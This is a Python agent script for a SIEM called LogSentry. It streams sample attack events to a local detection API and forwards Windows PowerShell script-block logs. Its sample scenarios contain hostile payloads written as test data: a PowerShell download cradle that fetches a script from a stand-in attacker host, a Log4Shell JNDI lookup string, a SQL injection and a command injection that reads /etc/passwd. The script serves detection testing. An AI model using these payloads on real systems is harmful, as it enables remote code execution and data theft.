#!/usr/bin/env python3
"""
LogSentry Laptop Agent & Live Telemetry Streamer
=================================================
Connects your laptop's real-time operations directly into LogSentry SIEM:
  1. Live Attack & Telemetry Streamer: Ingests realistic web and host traffic
     in real-time so you can watch your dashboard update live.
  2. Windows Event Log Tailer: Real-time forwarding of your laptop's PowerShell
     execution logs (Event 4104) directly into LogSentry.
  3. Syslog Network Streamer: Emits RFC 5424 UDP datagrams to port 1514.

Usage:
  python scripts/laptop_agent.py --stream
  python scripts/laptop_agent.py --live-powershell
  python scripts/laptop_agent.py --simulate-once
"""

import argparse
import json
import os
import platform
import socket
import subprocess
import time
from datetime import UTC, datetime
from typing import Any

import httpx

API_BASE = os.getenv("LOGSENTRY_API_URL", "http://127.0.0.1:8000/api/v1")
HOSTNAME = platform.node() or "user-laptop"

# Color helpers for terminal output
CYAN = "\033[96m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
RED = "\033[91m"
BOLD = "\033[1m"
RESET = "\033[0m"


def print_banner():
    print(f"{CYAN}{BOLD}")
    print("=" * 68)
    print("      LOGSENTRY SIEM — LAPTOP INTEGRATION & LIVE STREAMER       ")
    print("=" * 68)
    print(f"{RESET}")
    print(f" Host Machine:  {BOLD}{HOSTNAME}{RESET}")
    print(f" Target SIEM:   {BOLD}{API_BASE}{RESET}")
    print(f" Web Dashboard: {BOLD}http://localhost:5173/dashboard{RESET}")
    print("=" * 68 + "\n")


def send_event_to_api(event_dict: dict[str, Any]) -> dict[str, Any]:
    """Posts normalized telemetry event to LogSentry detection engine."""
    url = f"{API_BASE}/detection/analyze"
    try:
        res = httpx.post(url, json={"event": event_dict}, timeout=10.0)
        if res.status_code == 200:
            return res.json()
        print(
            f"{YELLOW}[API Warning] Status {res.status_code}: {res.text[:120]}{RESET}"
        )
    except Exception as e:
        print(f"{RED}[API Error] Failed to reach LogSentry backend: {e}{RESET}")
    return {}


# ─────────────────────────────────────────────────────────────
# 1. LIVE SIMULATION STREAMER (Instant real-time verification)
# ─────────────────────────────────────────────────────────────

SAMPLE_SCENARIOS = [
    {
        "name": "WordPress Admin Probe (Sigma Rule)",
        "parser_name": "apache",
        "raw_log": '198.51.100.42 - - [21/Nov/2026:11:00:01] "GET /wp-admin/setup-config.php HTTP/1.1" 404 128',
        "source_ip": "198.51.100.42",
        "method": "GET",
        "endpoint": "/wp-admin/setup-config.php",
        "status_code": 404,
    },
    {
        "name": "SQL Injection in User Profile",
        "parser_name": "nginx",
        "raw_log": '185.220.101.5 - - [21/Nov/2026:11:00:05] "GET /api/v1/users?id=1%20UNION%20SELECT%20username,password%20FROM%20users-- HTTP/1.1" 200 4096',
        "source_ip": "185.220.101.5",
        "method": "GET",
        "endpoint": "/api/v1/users?id=1 UNION SELECT username,password FROM users--",
        "status_code": 200,
    },
    {
        "name": "Suspicious PowerShell Download Cradle (Sigma Rule)",
        "parser_name": "windows_event",
        "raw_log": json.dumps(
            {
                "EventID": 4104,
                "Computer": HOSTNAME,
                "EventData": {
                    "ScriptBlockText": "IEX(New-Object Net.WebClient).DownloadString('http://threat-actor.xyz/beacon.ps1')",
                    "TargetUserName": "AnalystUser",
                    "IpAddress": "127.0.0.1",
                },
            }
        ),
        "source_ip": "127.0.0.1",
        "hostname": HOSTNAME,
        "user": "AnalystUser",
        "method": "POST",
        "endpoint": "/windows/exec?cmd=IEX(New-Object Net.WebClient).DownloadString('http://threat-actor.xyz/beacon.ps1')",
        "command_line": "IEX(New-Object Net.WebClient).DownloadString('http://threat-actor.xyz/beacon.ps1')",
        "status_code": 200,
    },
    {
        "name": "Log4Shell CVE-2021-44228 JNDI Exploit",
        "parser_name": "apache",
        "raw_log": '45.155.205.233 - - [21/Nov/2026:11:00:10] "GET /login?token=${jndi:ldap://evil-c2.net:1389/Exploit} HTTP/1.1" 500 512',
        "source_ip": "45.155.205.233",
        "method": "GET",
        "endpoint": "/login?token=${jndi:ldap://evil-c2.net:1389/Exploit}",
        "status_code": 500,
    },
    {
        "name": "Linux SSH Brute Force (Sigma Rule)",
        "parser_name": "linux_auth",
        "raw_log": "Nov 21 11:00:15 secure-bastion sshd[28491]: Failed password for invalid user root from 194.26.29.112 port 44321 ssh2",
        "source_ip": "194.26.29.112",
        "hostname": "secure-bastion",
        "user": "root",
        "method": "POST",
        "endpoint": "/ssh/auth",
        "status_code": 401,
    },
    {
        "name": "Command Injection in Diagnostic API",
        "parser_name": "apache",
        "raw_log": '10.0.0.88 - - [21/Nov/2026:11:00:20] "POST /api/diagnostics/ping HTTP/1.1" 200 1024 - 127.0.0.1; cat /etc/passwd',
        "source_ip": "10.0.0.88",
        "method": "POST",
        "endpoint": "/api/diagnostics/ping?ip=127.0.0.1; cat /etc/passwd",
        "status_code": 200,
    },
    {
        "name": "Normal Safe Web Traffic",
        "parser_name": "nginx",
        "raw_log": '10.0.0.15 - - [21/Nov/2026:11:00:25] "GET /dashboard/overview HTTP/1.1" 200 1540',
        "source_ip": "10.0.0.15",
        "method": "GET",
        "endpoint": "/dashboard/overview",
        "status_code": 200,
    },
]


def run_stream(interval_seconds: float = 3.0):
    """Continuously streams scenarios into LogSentry, triggering real-time alerts."""
    print_banner()
    print(f"{GREEN}[+] Live Streamer started.{RESET}")
    print(
        f"    Streaming telemetry every {interval_seconds}s. Open {BOLD}http://localhost:5173/dashboard{RESET} to observe live metrics."
    )
    print("    Press Ctrl+C to stop at any time.\n")

    idx = 0
    try:
        while True:
            scenario = SAMPLE_SCENARIOS[idx % len(SAMPLE_SCENARIOS)]
            now_iso = datetime.now(UTC).isoformat()
            ts = datetime.now().strftime("%H:%M:%S")

            # Clone and timestamp
            event = dict(scenario)
            event["timestamp"] = now_iso

            result = send_event_to_api(event)
            alerts = result.get("alerts", [])

            if alerts:
                for a in alerts:
                    sev = a.get("severity", "UNKNOWN")
                    sev_color = RED if sev in ("CRITICAL", "HIGH") else YELLOW
                    print(
                        f"[{ts}] {BOLD}{scenario['name']}{RESET}\n"
                        f"       IP: {scenario.get('source_ip')} | Method: {scenario.get('http_method')}\n"
                        f"       ↳ {sev_color}[ALERT] {sev}: {a.get('title')} (Rule: {a.get('rule_name')}){RESET}"
                    )
            else:
                print(
                    f"[{ts}] {GREEN}[INFO] Ingested Normal Event:{RESET} {scenario['name']} ({scenario.get('path')})"
                )

            idx += 1
            time.sleep(interval_seconds)

    except KeyboardInterrupt:
        print(f"\n{YELLOW}[!] Live streaming stopped by user.{RESET}")


# ─────────────────────────────────────────────────────────────
# 2. REAL WINDOWS LAPTOP HOST AGENT (PowerShell Operational)
# ─────────────────────────────────────────────────────────────


def run_live_powershell_monitor():
    """Tails Windows PowerShell Operational log and forwards commands in real-time."""
    print_banner()
    if platform.system() != "Windows":
        print(
            f"{RED}[-] Live PowerShell monitoring is only available on Windows.{RESET}"
        )
        return

    print(f"{GREEN}[+] Live Windows Host Agent initialized on {HOSTNAME}.{RESET}")
    print("    Monitoring local PowerShell script execution (Event 4104) in real time.")
    print("    Open another PowerShell window and try running:")
    print(
        f"      {BOLD}powershell -Command \"IEX(New-Object Net.WebClient).DownloadString('http://test.local/p.ps1')\"{RESET}"
    )
    print("    Press Ctrl+C to exit.\n")

    last_record_id = 0

    # Query initial latest record ID
    init_cmd = [
        "powershell",
        "-NoProfile",
        "-Command",
        "(Get-WinEvent -LogName 'Microsoft-Windows-PowerShell/Operational' -MaxEvents 1 -ErrorAction SilentlyContinue).RecordId",
    ]
    try:
        out = subprocess.check_output(  # noqa: S603, S607
            init_cmd, text=True, stderr=subprocess.DEVNULL
        )
        last_record_id = int(out.strip()) if out.strip().isdigit() else 0
    except Exception:
        last_record_id = 0

    print(f"[*] Baseline record ID: {last_record_id}. Listening for new events...\n")

    while True:
        try:
            ps_script = f"""
            $events = Get-WinEvent -LogName 'Microsoft-Windows-PowerShell/Operational' -FilterXPath "*[System[(RecordID > {last_record_id}) and (EventID=4104)]]" -ErrorAction SilentlyContinue
            if ($events) {{
                $events | ForEach-Object {{
                    [PSCustomObject]@{{
                        RecordId = $_.RecordId
                        TimeCreated = $_.TimeCreated.ToString("o")
                        EventID = $_.Id
                        Computer = $_.MachineName
                        ScriptBlockText = $_.Properties[2].Value
                        User = $_.UserId.Value
                    }}
                }} | ConvertTo-Json -Compress
            }}
            """
            proc = subprocess.run(
                ["powershell", "-NoProfile", "-Command", ps_script],  # noqa: S603, S607
                capture_output=True,
                text=True,
                check=False,
            )

            stdout = proc.stdout.strip()
            if stdout:
                # Could be a single JSON object or array
                records = []
                try:
                    parsed = json.loads(stdout)
                    records = parsed if isinstance(parsed, list) else [parsed]
                except Exception:
                    pass

                for r in records:
                    rec_id = r.get("RecordId", last_record_id)
                    if rec_id > last_record_id:
                        last_record_id = rec_id

                    script_text = str(r.get("ScriptBlockText", "")).strip()
                    if not script_text or len(script_text) > 4000:
                        continue

                    ts = datetime.now().strftime("%H:%M:%S")
                    print(
                        f"[{ts}] {CYAN}[Local Host Event ID 4104]{RESET} User: {r.get('User')} | Script: {script_text[:80]}..."
                    )

                    # Build LogSentry LogEvent
                    event = {
                        "parser_name": "windows_event",
                        "raw_log": json.dumps(r),
                        "source_ip": "127.0.0.1",
                        "hostname": HOSTNAME,
                        "user": r.get("User") or os.getlogin(),
                        "method": "POST",
                        "endpoint": f"/windows/exec?cmd={script_text[:120]}",
                        "command_line": script_text,
                        "status_code": 200,
                        "timestamp": datetime.now(UTC).isoformat(),
                    }

                    res = send_event_to_api(event)
                    alerts = res.get("alerts", [])
                    for a in alerts:
                        sev = a.get("severity", "UNKNOWN")
                        print(
                            f"       ↳ {RED}{BOLD}[SIEM ALERT TRIGGERED] {sev}: {a.get('title')} (Rule: {a.get('rule_name')}){RESET}"
                        )

            time.sleep(2.0)
        except KeyboardInterrupt:
            print(f"\n{YELLOW}[!] Windows Host Agent stopped.{RESET}")
            break
        except Exception:
            time.sleep(3.0)


# ─────────────────────────────────────────────────────────────
# 3. SYSLOG UDP SENDER
# ─────────────────────────────────────────────────────────────


def send_syslog_message(message: str, host: str = "127.0.0.1", port: int = 1514):
    """Sends raw RFC 5424 Syslog UDP packet to LogSentry."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    now_iso = datetime.now(UTC).strftime("%Y-%m-%dT%H:%M:%SZ")
    raw = f"<14>1 {now_iso} {HOSTNAME} LogSentryAgent 1234 ID42 - {message}"
    sock.sendto(raw.encode("utf-8"), (host, port))
    sock.close()
    print(f"{GREEN}[✓] Sent Syslog packet to {host}:{port}:{RESET} {raw}")


def main():
    parser = argparse.ArgumentParser(
        description="LogSentry Laptop Agent & Telemetry Streamer"
    )
    parser.add_argument(
        "--stream",
        action="store_true",
        help="Continuously stream realistic attack scenarios to observe live dashboard updates.",
    )
    parser.add_argument(
        "--live-powershell",
        action="store_true",
        help="Tail local Windows PowerShell execution logs and send to LogSentry.",
    )
    parser.add_argument(
        "--simulate-once",
        action="store_true",
        help="Send one batch of diverse attacks and display the detections.",
    )
    parser.add_argument(
        "--syslog",
        type=str,
        help="Send a test Syslog message to UDP port 1514.",
    )
    parser.add_argument(
        "--interval",
        type=float,
        default=3.0,
        help="Interval between streamed events in seconds (default: 3.0)",
    )

    args = parser.parse_args()

    if args.live_powershell:
        run_live_powershell_monitor()
    elif args.simulate_once:
        print_banner()
        for s in SAMPLE_SCENARIOS:
            ev = dict(s)
            ev["timestamp"] = datetime.now(UTC).isoformat()
            res = send_event_to_api(ev)
            alerts = res.get("alerts", [])
            print(
                f"[*] {s['name']}: {len(alerts)} alerts generated -> {[a['title'] for a in alerts]}"
            )
    elif args.syslog:
        send_syslog_message(args.syslog)
    else:
        # Default to stream mode
        run_stream(interval_seconds=args.interval)


if __name__ == "__main__":
    main()
